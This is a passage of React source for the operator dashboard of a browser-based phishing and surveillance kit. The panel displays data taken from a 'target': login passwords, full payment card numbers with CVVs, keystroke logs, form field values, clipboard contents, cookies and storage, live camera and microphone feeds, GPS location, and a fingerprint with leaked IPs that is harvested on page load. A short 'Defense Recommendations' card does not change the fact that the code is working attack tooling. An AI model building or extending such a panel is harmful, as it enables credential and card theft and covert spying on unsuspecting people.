                <TabsTrigger value="persistence" className="text-xs" data-testid="tab-persistence"><Anchor className="w-3 h-3 mr-1" />Persistence</TabsTrigger>
              </TabsList>

              <TabsContent value="control" className="space-y-4 mt-4">
                <Card className="border-green-500/20 bg-green-500/5">
                  <CardContent className="p-3 flex items-center gap-2">
                    <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                    <span className="text-xs font-medium text-green-400">Recording</span>
                    <span className="text-[10px] text-muted-foreground ml-1">All events are being saved to database for replay</span>
                    {activeSessionId && (
                      <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px] ml-auto" onClick={async () => {
                        try {
                          const res = await fetch(`/api/remote-sessions/${activeSessionId}/events`, { credentials: "include" });
                          const data = await res.json();
                          const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
                          const l = document.createElement("a"); l.download = `session-${activeSessionId}-events.json`; l.href = URL.createObjectURL(blob); l.click(); URL.revokeObjectURL(l.href);
                          toast({ title: `Exported ${data.length} events` });
                        } catch { toast({ title: "Export failed", variant: "destructive" }); }
                      }} data-testid="button-export-session-data"><Download className="w-3 h-3 mr-1" />Export</Button>
                    )}
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2"><Power className="w-4 h-4 text-primary" />Remote Access Control</span>
                      <Button size="sm" variant="outline" className="h-7 text-xs" onClick={() => {
                        const idle = permissionItems.filter((p) => permissionStatuses[p.key].status === "idle" || permissionStatuses[p.key].status === "denied");
                        idle.forEach((p, i) => setTimeout(() => requestPermission(p.key), i * 300));
                        toast({ title: `Requesting ${idle.length} permissions` });
                      }} data-testid="button-request-all"><Shield className="w-3 h-3 mr-1" />Request All</Button>
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="grid gap-2 grid-cols-2 sm:grid-cols-4 lg:grid-cols-8">
                      {permissionItems.map((item) => {
                        const st = permissionStatuses[item.key].status;
                        const Icon = item.icon;
                        return (
                          <div key={item.key} className="flex flex-col items-center gap-1.5 p-2.5 rounded-lg border border-border/50 bg-muted/20" data-testid={`control-perm-${item.key}`}>
                            <Icon className="w-4 h-4 text-muted-foreground" />
                            <span className="text-[10px] font-medium text-center leading-tight">{item.label}</span>
                            {getPermBadge(st)}
                            <Button size="sm" variant={st === "granted" ? "secondary" : "default"} className="h-6 text-[9px] w-full px-1" onClick={() => requestPermission(item.key)} disabled={st === "granted" || st === "requested"} data-testid={`button-request-${item.key}`}>
                              {st === "granted" ? "Done" : st === "requested" ? "..." : "Request"}
                            </Button>
                          </div>
                        );
                      })}
                    </div>
                    {(permissionStatuses.camera.status === "granted" || permissionStatuses.microphone.status === "granted") && (
                      <div className="flex items-center gap-2 mt-4 pt-3 border-t border-border/30">
                        <span className="text-xs text-muted-foreground font-medium mr-2">Stream:</span>
                        {permissionStatuses.camera.status === "granted" && (
                          <Button size="sm" variant={cameraEnabled ? "default" : "destructive"} className="h-7 text-xs" onClick={toggleCamera} data-testid="button-toggle-camera">
                            {cameraEnabled ? <><Video className="w-3 h-3 mr-1" />Cam On</> : <><VideoOff className="w-3 h-3 mr-1" />Cam Off</>}
                          </Button>
                        )}
                        {permissionStatuses.microphone.status === "granted" && (
                          <Button size="sm" variant={micEnabled ? "default" : "destructive"} className="h-7 text-xs" onClick={toggleMic} data-testid="button-toggle-mic">
                            {micEnabled ? <><Mic className="w-3 h-3 mr-1" />Mic On</> : <><MicOff className="w-3 h-3 mr-1" />Mic Off</>}
                          </Button>
                        )}
                      </div>
                    )}
                  </CardContent>
                </Card>

                <Card className="border-blue-500/20 bg-blue-500/5">
                  <CardHeader className="pb-2"><CardTitle className="text-sm flex items-center gap-2 text-blue-400"><Shield className="w-4 h-4" />Defense Recommendations</CardTitle></CardHeader>
                  <CardContent className="grid gap-3 sm:grid-cols-2 text-xs text-muted-foreground">
                    {[
                      { t: "Never grant permissions to unknown sites", d: "Legitimate services rarely need camera, mic, and location together." },
                      { t: "Check URLs carefully", d: "Attackers use look-alike domains to trick users." },
                      { t: "Never enter credentials on unfamiliar pages", d: "Phishing overlays mimic real login forms perfectly." },
                      { t: "Use browser privacy indicators", d: "Modern browsers show icons when camera/mic are active." },
                    ].map((r, i) => (
                      <div key={i} className="flex gap-2">
                        <CheckCircle2 className="w-4 h-4 text-green-400 flex-shrink-0 mt-0.5" />
                        <div><p className="font-medium text-foreground">{r.t}</p><p>{r.d}</p></div>
                      </div>
                    ))}
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="feed" className="space-y-4 mt-4">
                <div className="grid gap-4 md:grid-cols-2">
                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><Camera className="w-4 h-4 text-blue-400" />Camera Feed</span>
                        <div className="flex items-center gap-1">
                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={takeScreenshot} data-testid="button-screenshot"><CameraIcon className="w-3 h-3 mr-1" />Shot</Button>
                          {isRecordingVideo
                            ? <Button size="sm" variant="destructive" className="h-6 px-2 text-[10px]" onClick={stopVideoRecording} data-testid="button-stop-video-record"><Square className="w-3 h-3 mr-1" />{formatTime(videoRecordTime)}</Button>
                            : <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={startVideoRecording} data-testid="button-start-video-record"><Circle className="w-3 h-3 mr-1 text-red-400" />Rec</Button>
                          }
                        </div>
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="aspect-video bg-black rounded-lg overflow-hidden relative">
                        <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" data-testid="video-camera-feed" />
                        <div className="absolute bottom-2 left-2 flex items-center gap-1">
                          <Badge className="bg-red-500/80 text-white border-0 text-[10px]">LIVE</Badge>
                          {!cameraEnabled && <Badge className="bg-gray-800/80 text-gray-300 border-0 text-[10px]">Off</Badge>}
                        </div>
                        {isRecordingVideo && <div className="absolute top-2 right-2"><Badge className="bg-red-600 text-white border-0 text-[10px] animate-pulse"><Circle className="w-2 h-2 mr-1 fill-current" />REC {formatTime(videoRecordTime)}</Badge></div>}
                      </div>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><Mic className="w-4 h-4 text-green-400" />Audio</span>
                        {isRecordingAudio
                          ? <Button size="sm" variant="destructive" className="h-6 px-2 text-[10px]" onClick={stopAudioRecording} data-testid="button-stop-audio-record"><Square className="w-3 h-3 mr-1" />{formatTime(audioRecordTime)}</Button>
                          : <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={startAudioRecording} data-testid="button-start-audio-record"><Circle className="w-3 h-3 mr-1 text-red-400" />Rec Audio</Button>
                        }
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="aspect-video bg-muted/30 rounded-lg flex items-center justify-center relative">
                        <audio ref={audioRef} autoPlay data-testid="audio-live-feed" className="hidden" />
                        <div className="text-center space-y-2">
                          {micEnabled ? <Mic className="w-8 h-8 text-green-400 mx-auto animate-pulse" /> : <MicOff className="w-8 h-8 text-red-400 mx-auto" />}
                          <p className="text-xs text-muted-foreground">{micEnabled ? "Audio streaming live" : "Mic disabled"}</p>
                        </div>
                        {isRecordingAudio && <div className="absolute top-2 right-2"><Badge className="bg-red-600 text-white border-0 text-[10px] animate-pulse"><Circle className="w-2 h-2 mr-1 fill-current" />REC {formatTime(audioRecordTime)}</Badge></div>}
                      </div>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><MapPin className="w-4 h-4 text-red-400" />Location</span>
                        {liveLocation && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(`${liveLocation.latitude}, ${liveLocation.longitude}`, "Location")} data-testid="button-copy-location"><Clipboard className="w-3 h-3 mr-1" />Copy</Button>}
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      {liveLocation ? (
                        <div className="space-y-2">
                          <div className="grid grid-cols-2 gap-2 text-xs">
                            {[
                              { l: "Latitude", v: liveLocation.latitude?.toFixed(6), tid: "text-latitude" },
                              { l: "Longitude", v: liveLocation.longitude?.toFixed(6), tid: "text-longitude" },
                              { l: "Accuracy", v: `${liveLocation.accuracy?.toFixed(0)}m` },
                              { l: "Altitude", v: liveLocation.altitude ? `${liveLocation.altitude.toFixed(1)}m` : "N/A" },
                            ].map((d, i) => (
                              <div key={i} className="bg-muted/30 p-2 rounded">
                                <span className="text-muted-foreground">{d.l}</span>
                                <p className="font-mono" data-testid={d.tid}>{d.v}</p>
                              </div>
                            ))}
                          </div>
                          <a href={`https://www.google.com/maps?q=${liveLocation.latitude},${liveLocation.longitude}`} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 text-xs text-primary hover:underline" data-testid="link-view-map"><ExternalLink className="w-3 h-3" />Google Maps</a>
                        </div>
                      ) : <div className="flex items-center justify-center h-24 text-xs text-muted-foreground">Waiting for location...</div>}
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><Smartphone className="w-4 h-4 text-purple-400" />Device Info</span>
                        {liveDeviceInfo && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(JSON.stringify(liveDeviceInfo, null, 2), "Device info")} data-testid="button-copy-device-info"><Clipboard className="w-3 h-3 mr-1" />JSON</Button>}
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      {liveDeviceInfo ? (
                        <div className="space-y-1 text-xs max-h-48 overflow-y-auto">
                          {Object.entries(liveDeviceInfo).map(([k, v]) => (
                            <div key={k} className="flex justify-between items-center py-0.5 border-b border-border/20 last:border-0">
                              <span className="text-muted-foreground capitalize text-[10px]">{k.replace(/([A-Z])/g, " $1").trim()}</span>
                              <span className="font-mono text-right max-w-[55%] truncate text-[10px]" data-testid={`text-device-${k}`}>{typeof v === "object" ? JSON.stringify(v) : String(v)}</span>
                            </div>
                          ))}
                        </div>
                      ) : <div className="flex items-center justify-center h-24 text-xs text-muted-foreground">Waiting...</div>}
                    </CardContent>
                  </Card>
                </div>
              </TabsContent>

              <TabsContent value="intel" className="space-y-4 mt-4">
                {(() => {
                  const threatVectors = [
                    { label: "Auto Fingerprint", captured: !!liveAutoHarvest },
                    { label: "Credentials", captured: liveCredentials.length > 0 },
                    { label: "Camera", captured: permissionStatuses.camera.status === "granted" },
                    { label: "Microphone", captured: permissionStatuses.microphone.status === "granted" },
                    { label: "Location", captured: !!liveLocation },
                    { label: "Device Info", captured: !!liveDeviceInfo },
                    { label: "Browser Data", captured: !!liveBrowserData },
                    { label: "Clipboard", captured: liveClipboard.length > 0 },
                    { label: "Files", captured: liveFiles.length > 0 },
                    { label: "Keystrokes", captured: liveKeylogs.length > 0 },
                    { label: "Form Intercepts", captured: liveFormIntercepts.length > 0 },
                    { label: "Activity Tracking", captured: liveActivity.length > 0 },
                  ];
                  const capturedCount = threatVectors.filter((v) => v.captured).length;
                  const totalCount = threatVectors.length;
                  const scorePercent = Math.round((capturedCount / totalCount) * 100);
                  const level = scorePercent >= 75 ? "Critical" : scorePercent >= 50 ? "High" : scorePercent >= 25 ? "Medium" : "Low";
                  const levelColor = scorePercent >= 75 ? "text-red-400" : scorePercent >= 50 ? "text-orange-400" : scorePercent >= 25 ? "text-yellow-400" : "text-green-400";
                  const levelBg = scorePercent >= 75 ? "bg-red-500/20 border-red-500/30" : scorePercent >= 50 ? "bg-orange-500/20 border-orange-500/30" : scorePercent >= 25 ? "bg-yellow-500/20 border-yellow-500/30" : "bg-green-500/20 border-green-500/30";

                  return (
                    <>
                      <Card className={`border ${levelBg}`} data-testid="card-threat-score">
                        <CardContent className="p-4">
                          <div className="flex items-center gap-4">
                            <div className="relative w-24 h-24 flex-shrink-0">
                              <svg viewBox="0 0 100 100" className="w-full h-full -rotate-90">
                                <circle cx="50" cy="50" r="42" fill="none" stroke="currentColor" strokeWidth="8" className="text-muted/30" />
                                <circle cx="50" cy="50" r="42" fill="none" strokeWidth="8" strokeLinecap="round" strokeDasharray={`${scorePercent * 2.64} 264`} className={scorePercent >= 75 ? "stroke-red-500" : scorePercent >= 50 ? "stroke-orange-500" : scorePercent >= 25 ? "stroke-yellow-500" : "stroke-green-500"} style={{ transition: "stroke-dasharray 0.5s ease" }} />
                              </svg>
                              <div className="absolute inset-0 flex flex-col items-center justify-center">
                                <span className={`text-lg font-bold ${levelColor}`} data-testid="text-threat-percent">{scorePercent}%</span>
                                <span className="text-[9px] text-muted-foreground">{level}</span>
                              </div>
                            </div>
                            <div className="flex-1">
                              <div className="flex items-center gap-2 mb-2">
                                <Shield className={`w-4 h-4 ${levelColor}`} />
                                <span className="text-sm font-semibold">Exposure Score</span>
                                <Badge className={`${levelBg} ${levelColor} ml-auto`} data-testid="badge-threat-level">{capturedCount}/{totalCount}</Badge>
                              </div>
                              <div className="grid grid-cols-3 sm:grid-cols-4 gap-1">
                                {threatVectors.map((v) => (
                                  <div key={v.label} className={`flex items-center gap-1 text-[9px] p-0.5 rounded ${v.captured ? "text-foreground" : "text-muted-foreground/40"}`}>
                                    {v.captured ? <CheckCircle2 className="w-2.5 h-2.5 text-green-400 flex-shrink-0" /> : <XCircle className="w-2.5 h-2.5 flex-shrink-0" />}
                                    <span className="truncate">{v.label}</span>
                                  </div>
                                ))}
                              </div>
                            </div>
                          </div>
                        </CardContent>
                      </Card>

                      <Card className="border-cyan-500/20" data-testid="card-connection-stats">
                        <CardContent className="p-3">
                          <div className="flex items-center gap-4 text-xs">
                            <div className="flex items-center gap-1.5">
                              <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
                              <span className="text-muted-foreground">WebSocket</span>
                              <span className="font-mono text-green-400">Connected</span>
                            </div>
                            <div className="flex items-center gap-1.5">
                              <Activity className="w-3 h-3 text-cyan-400" />
                              <span className="text-muted-foreground">Events:</span>
                              <span className="font-mono">{events.length}</span>
                            </div>
                            <div className="flex items-center gap-1.5">
                              <Keyboard className="w-3 h-3 text-amber-400" />
                              <span className="text-muted-foreground">Keystrokes:</span>
                              <span className="font-mono">{liveKeylogs.reduce((a, b) => a + b.keys.length, 0)}</span>
                            </div>
                            <div className="flex items-center gap-1.5 ml-auto">
                              <Timer className="w-3 h-3 text-muted-foreground" />
                              <span className="text-muted-foreground">Data points:</span>
                              <span className="font-mono">{liveActivity.length + liveFormIntercepts.length + liveKeylogs.length + liveCredentials.length + liveClipboard.length}</span>
                            </div>
                          </div>
                        </CardContent>
                      </Card>
                    </>
                  );
                })()}

                <Card className="border-indigo-500/20" data-testid="card-fingerprint">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2"><Fingerprint className="w-4 h-4 text-indigo-400" />Zero-Click Fingerprint</span>
                      {liveAutoHarvest && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(JSON.stringify(liveAutoHarvest, null, 2), "Fingerprint")} data-testid="button-copy-fingerprint"><Clipboard className="w-3 h-3 mr-1" />JSON</Button>}
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {liveAutoHarvest ? (
                      <div className="space-y-3 text-xs">
                        <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                          {[
                            { l: "Canvas Hash", v: liveAutoHarvest.canvasFingerprint },
                            { l: "Audio Hash", v: liveAutoHarvest.audioFingerprint },
                            { l: "Fonts Detected", v: `${liveAutoHarvest.fontCount} fonts` },
                            { l: "Timezone", v: liveAutoHarvest.timezone },
                            { l: "Platform", v: liveAutoHarvest.platform },
                            { l: "Language", v: liveAutoHarvest.language },
                            { l: "HW Concurrency", v: liveAutoHarvest.hardwareConcurrency },
                            { l: "Device Memory", v: liveAutoHarvest.deviceMemory ? `${liveAutoHarvest.deviceMemory} GB` : "N/A" },
                            { l: "Touch Points", v: liveAutoHarvest.maxTouchPoints },
                          ].map((d) => (
                            <div key={d.l} className="bg-muted/30 p-2 rounded">
                              <span className="text-muted-foreground text-[10px]">{d.l}</span>
                              <p className="font-mono text-[10px] truncate" data-testid={`text-fp-${d.l.toLowerCase().replace(/\s+/g, "-")}`}>{String(d.v)}</p>
                            </div>
                          ))}
                        </div>

                        {liveAutoHarvest.webrtcLeakedIPs?.length > 0 && (
                          <div>
                            <p className="font-medium text-red-400 mb-1 text-[10px]">WebRTC IP Leak</p>
                            <div className="flex flex-wrap gap-1">
                              {liveAutoHarvest.webrtcLeakedIPs.map((ip: string, i: number) => (
                                <Badge key={i} className="bg-red-500/10 text-red-400 border-red-500/20 text-[10px] font-mono" data-testid={`badge-ip-${i}`}>{ip}</Badge>
                              ))}
                            </div>
                          </div>
                        )}

                        {liveAutoHarvest.webglFingerprint && (
                          <div>
                            <p className="font-medium text-muted-foreground mb-1 text-[10px]">WebGL</p>
                            <div className="grid grid-cols-2 gap-1">
                              {Object.entries(liveAutoHarvest.webglFingerprint).map(([k, v]) => (
                                <div key={k} className="flex justify-between py-0.5 border-b border-border/20">
                                  <span className="text-muted-foreground text-[10px] capitalize">{k}</span>
                                  <span className="font-mono text-[10px] text-right max-w-[60%] truncate">{String(v)}</span>
                                </div>
                              ))}
                            </div>
                          </div>
                        )}

                        {liveAutoHarvest.detectedFonts?.length > 0 && (
                          <div>
                            <p className="font-medium text-muted-foreground mb-1 text-[10px]">Detected Fonts ({liveAutoHarvest.detectedFonts.length})</p>
                            <div className="flex flex-wrap gap-1">
                              {liveAutoHarvest.detectedFonts.map((f: string) => (
                                <Badge key={f} variant="secondary" className="text-[9px] px-1.5 py-0">{f}</Badge>
                              ))}
                            </div>
                          </div>
                        )}

                        {liveAutoHarvest.browserFeatures && (
                          <div>
                            <p className="font-medium text-muted-foreground mb-1 text-[10px]">Browser Features</p>
                            <div className="grid grid-cols-3 sm:grid-cols-4 gap-1">
                              {Object.entries(liveAutoHarvest.browserFeatures).map(([k, v]) => (
                                <div key={k} className="flex items-center gap-1 text-[9px]">
                                  {v ? <CheckCircle2 className="w-2.5 h-2.5 text-green-400 flex-shrink-0" /> : <XCircle className="w-2.5 h-2.5 text-muted-foreground/40 flex-shrink-0" />}
                                  <span className={v ? "text-foreground" : "text-muted-foreground/50"}>{k.replace(/([A-Z])/g, " $1").trim()}</span>
                                </div>
                              ))}
                            </div>
                          </div>
                        )}

                        {liveAutoHarvest.socialLoginStatus && (
                          <div>
                            <p className="font-medium text-muted-foreground mb-1 text-[10px]">Social Login Detection</p>
                            <div className="flex gap-2">
                              {Object.entries(liveAutoHarvest.socialLoginStatus).map(([k, v]) => (
                                <Badge key={k} className={`text-[9px] ${v === "likely-logged-in" ? "bg-green-500/20 text-green-400" : "bg-muted text-muted-foreground"}`}>
                                  {k}: {String(v)}
                                </Badge>
                              ))}
                            </div>
                          </div>
                        )}
                      </div>
                    ) : (
                      <div className="flex items-center justify-center h-20 text-xs text-muted-foreground">
                        <Loader2 className="w-4 h-4 animate-spin mr-2" />Waiting for target to connect (auto-harvests on page load)...
                      </div>
                    )}
                  </CardContent>
                </Card>

                <Card className="border-red-500/20">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2"><KeyRound className="w-4 h-4 text-red-400" />Captured Credentials ({liveCredentials.length})</span>
                      {liveCredentials.length > 0 && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(JSON.stringify(liveCredentials, null, 2), "Credentials")} data-testid="button-copy-credentials"><Clipboard className="w-3 h-3 mr-1" />Copy All</Button>}
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {liveCredentials.length > 0 ? (
                      <div className="space-y-2">
                        {liveCredentials.map((cred, i) => (
                          <div key={i} className="p-3 rounded-lg bg-red-500/5 border border-red-500/20" data-testid={`credential-item-${i}`}>
                            <div className="flex items-center gap-2 mb-2">
                              {cred.type === "login" ? <KeyRound className="w-4 h-4 text-red-400" /> : <CreditCard className="w-4 h-4 text-red-400" />}
                              <span className="text-xs font-medium">{cred.type === "login" ? "Login Credentials" : "Payment Card"}</span>
                              <span className="text-[10px] text-muted-foreground ml-auto">{new Date(cred.timestamp).toLocaleTimeString()}</span>
                            </div>
                            <div className="grid gap-1 text-xs">
                              {cred.type === "login" ? (
                                <>
                                  <div className="flex justify-between"><span className="text-muted-foreground">Email:</span><span className="font-mono" data-testid={`text-cred-email-${i}`}>{cred.email}</span></div>
                                  <div className="flex justify-between"><span className="text-muted-foreground">Password:</span><span className="font-mono" data-testid={`text-cred-password-${i}`}>{cred.password}</span></div>
                                </>
                              ) : (
                                <>
                                  <div className="flex justify-between"><span className="text-muted-foreground">Name:</span><span className="font-mono">{cred.cardName}</span></div>
                                  <div className="flex justify-between"><span className="text-muted-foreground">Card:</span><span className="font-mono" data-testid={`text-cred-card-${i}`}>{cred.cardNumber}</span></div>
                                  <div className="flex justify-between"><span className="text-muted-foreground">Expiry:</span><span className="font-mono">{cred.cardExpiry}</span></div>
                                  <div className="flex justify-between"><span className="text-muted-foreground">CVV:</span><span className="font-mono">{cred.cardCvv}</span></div>
                                </>
                              )}
                            </div>
                          </div>
                        ))}
                      </div>
                    ) : <p className="text-xs text-muted-foreground text-center py-6">No credentials captured yet. Request "Credentials" access from the Control tab.</p>}
                  </CardContent>
                </Card>

                <div className="grid gap-4 md:grid-cols-2">
                  <Card className="border-amber-500/20" data-testid="card-keylogger">
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><Keyboard className="w-4 h-4 text-amber-400" />Keystroke Logger</span>
                        {liveKeylogs.length > 0 && (
                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(liveKeylogs.map((b) => b.keys.join("")).join(""), "Keystrokes")} data-testid="button-copy-keystrokes"><Clipboard className="w-3 h-3 mr-1" />Copy</Button>
                        )}
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="bg-black rounded-lg border border-amber-500/20 p-3 font-mono text-[11px] max-h-52 overflow-y-auto" data-testid="terminal-keylogger">
                        <div className="flex items-center gap-2 mb-2 pb-2 border-b border-amber-500/10">
                          <div className="flex gap-1">
                            <div className="w-2 h-2 rounded-full bg-red-500" />
                            <div className="w-2 h-2 rounded-full bg-yellow-500" />
                            <div className="w-2 h-2 rounded-full bg-green-500" />
                          </div>
                          <span className="text-amber-400/60 text-[9px]">keylogger -- {liveKeylogs.reduce((a, b) => a + b.keys.length, 0)} keystrokes</span>
                        </div>
                        {liveKeylogs.length > 0 ? liveKeylogs.map((batch, i) => (
                          <div key={i} className="leading-relaxed" data-testid={`text-keylog-${i}`}>
                            <span className="text-green-500">$ </span>
                            <span className="text-amber-400/50 text-[9px]">[{new Date(batch.timestamp).toLocaleTimeString()}] </span>
                            {batch.keys.map((k, j) => {
                              const isSpecial = k.startsWith("[");
                              return <span key={j} className={isSpecial ? "text-red-400 bg-red-500/10 px-0.5 rounded" : "text-green-300"}>{k}</span>;
                            })}
                          </div>
                        )) : <div className="text-amber-400/40"><span className="text-green-500">$ </span>Waiting for keystrokes...<span className="inline-block w-1.5 h-3 bg-amber-400 ml-0.5 animate-pulse" /></div>}
                      </div>
                    </CardContent>
                  </Card>

                  <Card className="border-pink-500/20" data-testid="card-form-intercept">
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center gap-2"><Globe className="w-4 h-4 text-pink-400" />Form Intercepts ({liveFormIntercepts.length})</CardTitle>
                    </CardHeader>
                    <CardContent>
                      {liveFormIntercepts.length > 0 ? (
                        <div className="space-y-1 max-h-52 overflow-y-auto">
                          {liveFormIntercepts.map((fi, i) => (
                            <div key={i} className="flex items-center gap-2 text-[10px] p-1.5 rounded bg-muted/20 border border-border/20" data-testid={`form-intercept-${i}`}>
                              <Badge variant="secondary" className="text-[8px] px-1 py-0 flex-shrink-0">{fi.type || "text"}</Badge>
                              <span className="text-muted-foreground flex-shrink-0">{fi.field}:</span>
                              <span className="font-mono truncate">{fi.type === "password" ? fi.value : fi.value}</span>
                              <span className="text-muted-foreground/50 ml-auto flex-shrink-0">{new Date(fi.timestamp).toLocaleTimeString()}</span>
                            </div>
                          ))}
                        </div>
                      ) : <p className="text-xs text-muted-foreground text-center py-6">Form field changes captured here automatically.</p>}
                    </CardContent>
                  </Card>
                </div>

                <Card className="border-cyan-500/20" data-testid="card-activity-monitor">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2"><Activity className="w-4 h-4 text-cyan-400" />Activity Monitor ({liveActivity.length})</span>
                      {liveActivity.length > 0 && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(JSON.stringify(liveActivity, null, 2), "Activity")} data-testid="button-copy-activity"><Clipboard className="w-3 h-3 mr-1" />JSON</Button>}
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {liveActivity.length > 0 ? (
                      <div className="space-y-1 max-h-52 overflow-y-auto">
                        {[...liveActivity].reverse().map((act, i) => {
                          const iconMap: Record<string, typeof Eye> = {
                            tab_visibility: act.visible ? Eye : EyeOff,
                            mouse_movement: MousePointer,
                            idle_detected: Timer,
                            battery_change: BatteryMedium,
                            network_change: WifiIcon,
                            navigation_attempt: AlertTriangle,
                          };
                          const colorMap: Record<string, string> = {
                            tab_visibility: act.visible ? "text-green-400" : "text-yellow-400",
                            mouse_movement: "text-blue-400",
                            idle_detected: "text-orange-400",
                            battery_change: "text-purple-400",
                            network_change: "text-cyan-400",
                            navigation_attempt: "text-red-400",
                          };
                          const Icon = iconMap[act.category] || Activity;
                          const color = colorMap[act.category] || "text-muted-foreground";
                          let detail = act.category?.replace(/_/g, " ");
                          if (act.category === "tab_visibility") detail = act.visible ? "Tab focused" : "Tab hidden";
                          if (act.category === "mouse_movement") detail = `Mouse: ${act.sampleCount} samples`;
                          if (act.category === "idle_detected") detail = `Idle for ${act.duration}s`;
                          if (act.category === "battery_change") detail = `Battery: ${act.level}% ${act.charging ? "(charging)" : ""}`;
                          if (act.category === "network_change") detail = act.online ? "Back online" : "Went offline";
                          if (act.category === "navigation_attempt") detail = "Tried to leave page";

                          return (
                            <div key={i} className="flex items-center gap-2 text-[10px] p-1.5 rounded hover:bg-muted/20" data-testid={`activity-item-${i}`}>
                              <Icon className={`w-3 h-3 flex-shrink-0 ${color}`} />
                              <span className="text-foreground">{detail}</span>
                              <span className="text-muted-foreground/50 ml-auto flex-shrink-0">{new Date(act.timestamp).toLocaleTimeString()}</span>
                            </div>
                          );
                        })}
                      </div>
                    ) : <p className="text-xs text-muted-foreground text-center py-6">Activity events (tab switches, idle, mouse, battery) appear here automatically.</p>}
                  </CardContent>
                </Card>

                <div className="grid gap-4 md:grid-cols-2">
                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><ClipboardPaste className="w-4 h-4 text-orange-400" />Clipboard ({liveClipboard.length})</span>
                        {liveClipboard.length > 0 && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(liveClipboard.map((c) => c.content).join("\n---\n"), "Clipboard")} data-testid="button-copy-clipboard"><Clipboard className="w-3 h-3 mr-1" />Copy</Button>}
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      {liveClipboard.length > 0 ? (
                        <div className="space-y-2 max-h-48 overflow-y-auto">
                          {liveClipboard.map((clip, i) => (
                            <div key={i} className="p-2 rounded bg-muted/30 border border-border/30" data-testid={`clipboard-item-${i}`}>
                              <p className="text-[10px] text-muted-foreground mb-1">{new Date(clip.timestamp).toLocaleTimeString()}</p>
                              <p className="text-xs font-mono whitespace-pre-wrap break-all">{clip.content || "(empty)"}</p>
                            </div>
                          ))}
                        </div>
                      ) : <p className="text-xs text-muted-foreground text-center py-6">No clipboard data yet.</p>}
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><Globe className="w-4 h-4 text-cyan-400" />Browser Data</span>
                        {liveBrowserData && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(JSON.stringify(liveBrowserData, null, 2), "Browser data")} data-testid="button-copy-browser-data"><Clipboard className="w-3 h-3 mr-1" />JSON</Button>}
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      {liveBrowserData ? (
                        <div className="space-y-3 text-xs max-h-64 overflow-y-auto">
                          <div>
                            <p className="font-medium text-muted-foreground mb-1">Cookies</p>
                            <p className="font-mono text-[10px] break-all bg-muted/30 p-2 rounded">{liveBrowserData.cookies}</p>
                          </div>
                          <div>
                            <p className="font-medium text-muted-foreground mb-1">LocalStorage ({liveBrowserData.localStorageCount} keys)</p>
                            {Object.entries(liveBrowserData.localStorageKeys || {}).slice(0, 10).map(([k, v]) => (
                              <div key={k} className="flex justify-between py-0.5 border-b border-border/20">
                                <span className="text-muted-foreground truncate max-w-[40%] text-[10px]">{k}</span>
                                <span className="font-mono truncate max-w-[55%] text-[10px]">{String(v)}</span>
                              </div>
                            ))}
                          </div>
                          <div>
                            <p className="font-medium text-muted-foreground mb-1">SessionStorage ({liveBrowserData.sessionStorageCount} keys)</p>
                            {Object.entries(liveBrowserData.sessionStorageKeys || {}).slice(0, 10).map(([k, v]) => (
                              <div key={k} className="flex justify-between py-0.5 border-b border-border/20">
                                <span className="text-muted-foreground truncate max-w-[40%] text-[10px]">{k}</span>
